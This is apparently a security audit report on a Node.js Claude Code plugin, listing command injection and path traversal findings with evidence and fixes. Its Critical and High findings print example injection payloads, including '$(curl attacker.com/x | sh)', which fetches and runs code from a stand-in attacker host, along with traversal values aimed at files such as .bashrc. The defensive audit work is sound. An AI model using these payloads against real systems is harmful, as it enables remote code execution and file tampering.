# Security Audit — Pass 2: Command Injection + Path Traversal

## Findings

---

### [Critical] Shell command injection via `slug` in `forge-worktree.js`

**File:** `bin/forge-worktree.js:46–58`, `bin/forge-worktree.js:125–199`, `bin/forge-worktree.js:210–225`

**Description:**
The `slug` variable is taken directly from `process.argv[3]` with no validation or sanitisation. It is then interpolated into shell commands executed with `execSync`, which evaluates them through `/bin/sh -c` (POSIX) or `cmd.exe` (Windows). Double-quoting the interpolations partially mitigates injection on POSIX but does not on Windows, and the quoting itself is bypassable.

**Evidence:**
```js
// Line 17 — slug is raw argv, no sanitisation
const slug = process.argv[3];

// Line 46-48
const wtPath = path.join(WORKTREE_DIR, slug);
const branch = `forge/${slug}`;

// Line 58 — execSync with shell=true (default), slug embedded inside quotes
run(`git worktree add "${wtPath}" -b "${branch}"`);

// Line 138
const wtStatus = run(`git -C "${wtPath}" status --porcelain`, { allowFail: true });

// Line 142-143
execSync(`git -C "${wtPath}" commit -m "feat(forge): apply changes"`, { ... });

// Line 154
execSync(`git merge "${branch}" --no-edit`, { ... });

// Line 199-200
run(`git worktree remove "${wtPath}" --force`, { allowFail: true });
run(`git branch -d "${branch}"`, { allowFail: true });
```

**Risk:**
`execSync(command)` with a string argument invokes the shell. A slug such as:
```
"; touch /tmp/pwned #
```
causes the expanded command to become:
```
git worktree add ".worktrees/"; touch /tmp/pwned #" -b "forge/"; touch /tmp/pwned #"
```
On POSIX the first `"` closes the quoted string, `;` starts a new command, and `touch /tmp/pwned` executes. Substituting `$(curl attacker.com/x | sh)` achieves RCE.

The `branch` interpolation is equally injectable: a slug of `x" --no-ff; evil` yields `git merge "x" --no-ff; evil" --no-edit`.

The script is invoked by the apply skill and by `forge_create_worktree` (via `createWorktree` from forge-core). Any input that reaches those callers — feature names, run IDs from the board — propagates here without sanitisation.

**Recommendation:**
Replace all shell-interpolated git commands with argument-array forms using `execFileSync`:
```js
const { execFileSync } = require('child_process');
// Replace:  run(`git worktree add "${wtPath}" -b "${branch}"`)
// With:
execFileSync('git', ['worktree', 'add', wtPath, '-b', branch], {
  encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe']
});
```
`execFileSync` never invokes a shell; arguments are passed as-is to the kernel `execve` syscall so metacharacters have no effect. Additionally, validate `slug` before use — accept only `[a-zA-Z0-9_-]` characters and reject anything else:
```js
if (!/^[a-zA-Z0-9_-]+$/.test(slug)) {
  console.error('Invalid slug: ' + slug);
  process.exit(1);
}
```

---

### [High] Path traversal via `slug` / `runId` in `forge-worktree.js` file-path construction

**File:** `bin/forge-worktree.js:46`, `bin/forge-worktree.js:125`, `bin/forge-worktree.js:211`

**Description:**
`slug` is joined directly into file-system paths using `path.join(WORKTREE_DIR, slug)`. On all platforms `path.join('.worktrees', '../../evil')` resolves to `../evil`, placing the worktree two directories above the project root. With `path.join('.worktrees', '/etc/passwd')` on Windows (drive-relative paths), the result is platform-specific but potentially surprising.

**Evidence:**
```js
// Line 46 — no path.resolve + no containment check
const wtPath = path.join(WORKTREE_DIR, slug);
// slug = "../../some-other-project" → wtPath = "../../some-other-project"

// Line 125
const wtPath = path.join(WORKTREE_DIR, slug);
// merge() then does: git -C "../../some-other-project" add -A
// This commits all staged files from an arbitrary directory
```

**Risk:**
An attacker-controlled slug (e.g. from a feature name that flows to `createWorktree`) can direct `git -C` operations at arbitrary directories on the filesystem. The `add -A` + `commit` sequence in `merge()` would stage and commit all dirty files from the target directory. The `--force` removal at the end would attempt `git worktree remove "../../some-other-project"`, which fails safely, but the `git -C` commit step is the real danger.

**Recommendation:**
After computing `wtPath`, assert it is inside the expected directory:
```js
const absWt = path.resolve(wtPath);
const absDir = path.resolve(WORKTREE_DIR);
if (!absWt.startsWith(absDir + path.sep)) {
  console.error('Path traversal detected in slug: ' + slug);
  process.exit(1);
}
```
Combined with the slug character-set validation from the Critical finding above, both issues are resolved at the same entry point.

---

### [High] `runId` used as a filesystem path component with no sanitisation in `ctx-session-start.js`

**File:** `hooks/ctx-session-start.js:66`

**Description:**
`runId` is read from the in-memory `run-active.json` contents (which was written earlier by `forge_create_run`) and joined directly into a file path:
```js
const runPath = path.join(projectDir, '.pipeline', 'runs', runId, 'run.json');
```
If `run-active.json` on disk contains a tampered `runId` value such as `../../hooks/evil.js`, the path resolves to `projectDir/hooks/evil.js` (one level up from `.pipeline`) or further. Since this is a read path the immediate risk is information disclosure, but the same unguarded pattern in `mcp/server.js` (via `getRun`/`updateRun` from forge-core) will apply to write paths once forge-core is implemented.

**Evidence:**
```js
// ctx-session-start.js:66
const runPath = path.join(projectDir, '.pipeline', 'runs', runId, 'run.json');
const raw = fs.readFileSync(runPath, 'utf8');
```
`runId` is sourced from `run-active.json` which any process with write access to `.pipeline/` can tamper with.

**Risk:**
In the current read-only usage: exfiltration of arbitrary files within the OS file system (limited to files `node` can read). Once the write path in forge-core is live with the same pattern, this becomes arbitrary file write — which combined with the path traversal means agents can overwrite hook scripts, CLAUDE.md, or source files outside the project.

**Recommendation:**
Validate `runId` before use — accept only the `r-[a-f0-9]{8}` pattern generated by `randomUUID()`:
```js
if (!/^r-[a-f0-9]{8}$/.test(runId)) return null; // or error
```
Enforce this at the point of reading from any JSON file where `runId` is a user-controlled field.

---

### [High] `CLAUDE_PROJECT_DIR` environment variable is trusted without validation in MCP server

**File:** `mcp/server.js:17–19`, `mcp/lib/config-store.js:11–13`

**Description:**
`resolveProjectDir()` returns `process.env.CLAUDE_PROJECT_DIR || process.cwd()`. This variable is used as the root for all file-system operations — reading/writing `board.json`, `project.json`, `run-active.json`, `gate-pending.json`, the entire runs registry, and usage stats. There is no check that the resolved path stays within any expected boundary.

**Evidence:**
```js
// mcp/server.js:17-19
function resolveProjectDir() {
  return process.env.CLAUDE_PROJECT_DIR || process.cwd();
}
```
Used in every tool handler:
```js
const projectDir = resolveProjectDir();
const boardPath = join(projectDir, ".pipeline", "board.json"); // Write
```

**Risk:**
If an attacker can set or influence `CLAUDE_PROJECT_DIR` (e.g. via a compromised `.mcp.json`, a supply-chain attack on a dependency that also sets env vars, or a misconfiguration), the MCP server will read and write `.pipeline/*.json` in an arbitrary directory. Combined with `forge_update_run` writing `run.json` at `projectDir/.pipeline/runs/<runId>/run.json`, this becomes an arbitrary-directory write primitive. Similarly, `CLAUDE_PLUGIN_DATA` (used by `config-store.js`) is trusted without validation — a crafted value could redirect `forge-config.json` reads/writes to any path.

**Recommendation:**
After resolving, canonicalize and assert the path is a real directory:
```js
function resolveProjectDir() {
  const dir = process.env.CLAUDE_PROJECT_DIR || process.cwd();
  const resolved = path.resolve(dir);
  // Optionally: assert resolved exists and is a directory
  return resolved;
}
```
For `CLAUDE_PLUGIN_DATA`, similarly resolve and validate. Neither needs to be restricted to a specific subtree, but both should be resolved (removing `..` segments) before use so that downstream `join()` calls operate on a canonical base.

---

### [High] Shell injection via `URL` in `scripts/dashboard-server.mjs`

**File:** `scripts/dashboard-server.mjs:617`

**Description:**
The dashboard server calls `exec(cmd + " " + url, () => {})` where `url` is constructed from `HOST` and `PORT`. `HOST` defaults to `127.0.0.1` and `PORT` to a numeric constant, so under normal usage this is safe. However if either is sourced from an environment variable or config file, a crafted value injects into the shell command.

**Evidence:**
```js
// dashboard-server.mjs:614-617
const cmd = process.platform === "win32" ? "start"
  : process.platform === "darwin" ? "open"
  : "xdg-open";
exec(cmd + " " + url, () => {});
```
`url` is: `"http://" + HOST + ":" + PORT`. If `HOST = "127.0.0.1; curl attacker.com/x | sh"`, the exec becomes `xdg-open http://127.0.0.1; curl attacker.com/x | sh:PORT`.

**Risk:**
Conditional on attacker control of `HOST`. This is a development/diagnostic script (not a hook), reducing exposure, but the pattern is clearly wrong — `exec` with a shell-concatenated URL can execute arbitrary commands.

**Recommendation:**
Use `execFile` (not `exec`) to avoid shell interpretation:
```js
import { execFile } from "node:child_process";
execFile(cmd, [url], () => {});
```

---

### [Medium] `npmCmd` shell string assembled from `process.execPath` and `npmCli` without quoting validation in `mcp-deps-install.js`

**File:** `hooks/mcp-deps-install.js:104–106`, `hooks/mcp-deps-install.js:138`

**Description:**
`npmCmd` is built by embedding `process.execPath` and `npmCli` inside double quotes in a string passed to `execSync`. While these paths originate from Node's own executable location (not from user input), the quoting `'"' + process.execPath + '"'` is broken if either path contains a double-quote character — which is technically possible on some systems.

**Evidence:**
```js
// Lines 104-106
const npmCmd = fs.existsSync(npmCli)
  ? '"' + process.execPath + '" "' + npmCli + '"'
  : 'npm';

// Line 138 — execSync receives a shell string
execSync(npmCmd + ' install --prefix "' + target.dir.replace(/\\/g, '/') + '"', { ... });
```
If `process.execPath` were `/usr/bin/node"evil`, the constructed command breaks out of quotes. The `target.dir` path comes from `path.join(pluginRoot, 'mcp')` — `pluginRoot` comes from `CLAUDE_PLUGIN_ROOT` or `__dirname`, not from user input, so injection via that path requires environment variable compromise (see CLAUDE_PROJECT_DIR finding).

**Risk:**
On realistic systems `process.execPath` will not contain a double-quote. The medium rating reflects that this is a latent pattern issue that could become exploitable if the source of any component changes, and that `execSync` is being called with a shell-interpreted string rather than the safer `execFileSync` form.

**Recommendation:**
Replace the `execSync` string form with `execFileSync` using an argument array:
```js
const { execFileSync } = require('child_process');
execFileSync(process.execPath, [npmCli, 'install', '--prefix', target.dir], {
  stdio: ['ignore', 'ignore', 'inherit'],
  timeout: 60000
});
```
This eliminates all quoting concerns and does not invoke a shell.

---

### [Medium] `sessionId` used in temp file path without sanitisation in `ctx-session-start.js`

**File:** `hooks/ctx-session-start.js:159`

**Description:**
`sessionId` is taken from the hook payload JSON and embedded into a temp file path:
```js
const bridgePath = path.join(os.tmpdir(), `claude-ctx-${sessionId}.json`);
```
There is no validation that `sessionId` contains only expected characters. A value like `../evil` or `../../etc/cron.d/inject` would escape `os.tmpdir()`.

**Evidence:**
```js
// ctx-session-start.js:139, 159
const sessionId = payload.session_id;
// ...
const bridgePath = path.join(os.tmpdir(), `claude-ctx-${sessionId}.json`);
await fs.promises.writeFile(bridgePath, JSON.stringify({ remaining, timestamp: Date.now() }), 'utf8');
```

**Risk:**
The hook receives its payload from Claude Code's hook runtime, so `session_id` is not directly user-controllable in normal operation. However if the payload were tampered with (e.g. through a compromised hook input), a crafted `session_id` of `../../../home/user/.bashrc` would overwrite `.bashrc` with a JSON object. The content written is `{ remaining: <number>, timestamp: <number> }` so real exploitation requires the exact target file to be tolerant of that content format — lowering practical impact.

**Recommendation:**
Validate `sessionId` format before use:
```js
if (!sessionId || !/^[a-zA-Z0-9_-]+$/.test(sessionId)) { exitOk(); return; }
```

---

### [Low] `feature` string from board/gate data reaches error messages and log output unescaped

**File:** `hooks/gate-sync.js:73`, `mcp/server.js:504`, multiple locations

**Description:**
User-supplied feature strings (from `gateData.feature`, `board.todos[].text`) are interpolated directly into `console.error` log strings and error result messages. While this does not create RCE, it can cause log injection — terminal escape sequences in a feature name like `\x1b[2J` (clear screen) or `\x1b]0;injected-title\x07` (terminal title hijack) would be rendered by any terminal displaying the log.

**Evidence:**
```js
// gate-sync.js:116
console.error('[gate-sync] Auto-created run ' + run.runId + ' for ' + pipelineType);
// gateData.feature flows into run.feature, which flows into pipelineType-adjacent log lines

// mcp/server.js — error messages include feature strings directly
return errorResult("Provider not found or disabled: " + providerId);
```

**Risk:**
Terminal escape injection via malicious feature names. Severity is Low because this only affects developers viewing logs — not end users — and requires the attacker to already have write access to board/gate files.

**Recommendation:**
Strip or sanitise control characters from user-supplied strings before logging:
```js
const safe = (s) => String(s).replace(/[\x00-\x1f\x7f]/g, '');
console.error('[gate-sync] feature: ' + safe(gateData.feature));
```

---

### [Informational] `CLAUDE_PLUGIN_ROOT` trust boundary in `gate-sync.js`

**File:** `hooks/gate-sync.js:54–56`

**Description:**
`CLAUDE_PLUGIN_ROOT` is used to construct the import path for the forge-core module:
```js
const pluginRoot = process.env.CLAUDE_PLUGIN_ROOT || path.resolve(__dirname, '..');
const coreIndex = path.join(pluginRoot, 'packages', 'forge-core', 'src', 'runs', 'index.js');
const coreMod = await import('file:///' + coreIndex.replace(/\\/g, '/'));
```
If `CLAUDE_PLUGIN_ROOT` can be influenced by an attacker, this is a dynamic `import()` of an attacker-controlled path — code execution. However, the fallback to `path.resolve(__dirname, '..')` means that in normal operation the hook uses a fixed path, and `CLAUDE_PLUGIN_ROOT` is set by Claude Code's plugin loader, not by user project files.

Additionally, `forge-core/src/runs/index.js` does not exist on disk (the `packages/forge-core/src/` directory is empty). This means `gate-sync.js` always fails at the `import()` call, silently exits (the catch block logs and calls `exitOk()`), and performs no run-registry sync. This is a correctness bug as well as a security observation.

**Risk:**
No immediate risk given the `CLAUDE_PLUGIN_ROOT` source, but the pattern of `import()` from an environment-variable-derived path is worth documenting. The missing module is a functional bug.

**Recommendation:**
No security fix required for the env-var trust issue given the source. Fix the missing module: either ship `packages/forge-core/src/runs/index.js` or update `gate-sync.js` to import from the correct location.

---

### [Informational] `forge_update_run` / `forge_get_run` delegate to unresolvable forge-core module

**File:** `mcp/server.js:12`, `hooks/gate-sync.js:55`

**Description:**
Both the MCP server and `gate-sync.js` import from `packages/forge-core/src/runs/index.js`, which does not exist. At MCP server startup this will cause an unhandled import error and crash the server. At `gate-sync.js` import time the error is caught and the hook exits silently.

This means `forge_create_run`, `forge_get_run`, `forge_update_run`, `forge_create_worktree`, `forge_resume_run`, and all run-registry operations are currently non-functional, and the path-traversal risks in those operations (unvalidated `runId` used as a directory name under `.pipeline/runs/`) cannot be exercised until the module exists.

**Risk:**
Informational for security purposes — the missing module is a hard blocker before any run-registry path-traversal becomes exploitable. When the module is added, re-audit the `runId` → filesystem path construction for path traversal (no validation exists in the current call sites).

**Recommendation:**
Before shipping the forge-core module: validate `runId` format at the entry of `getRun`, `updateRun`, `createWorktree`, and any other function that builds a path from it. Pattern: `^r-[a-f0-9]{8}$`.

---

## Summary

| Severity | Count | Issues |
|---|---|---|
| Critical | 1 | Shell injection via unvalidated `slug` in `forge-worktree.js` |
| High | 4 | Path traversal via `slug`; `runId` path traversal; `CLAUDE_PROJECT_DIR` no boundary; `exec` injection in dashboard-server |
| Medium | 2 | `execSync` shell-string quoting in `mcp-deps-install`; `sessionId` path injection in temp file |
| Low | 1 | Terminal escape injection via feature strings in logs |
| Informational | 2 | `CLAUDE_PLUGIN_ROOT` dynamic import pattern; forge-core module missing (blocks run-registry path-traversal from being exercised) |

**The most urgent fix is the Critical finding in `bin/forge-worktree.js`.** Replacing all `execSync(template_string)` calls with `execFileSync(binary, argsArray)` and adding a slug character-set validator simultaneously resolves the Critical injection and the High path-traversal finding. That is a two-line change class affecting one file.

The High `CLAUDE_PROJECT_DIR` finding is architectural and requires no code change today — `path.resolve()` canonicalization is sufficient and takes one line per resolver function.

The `runId` path-traversal finding must be addressed in forge-core before that module ships.
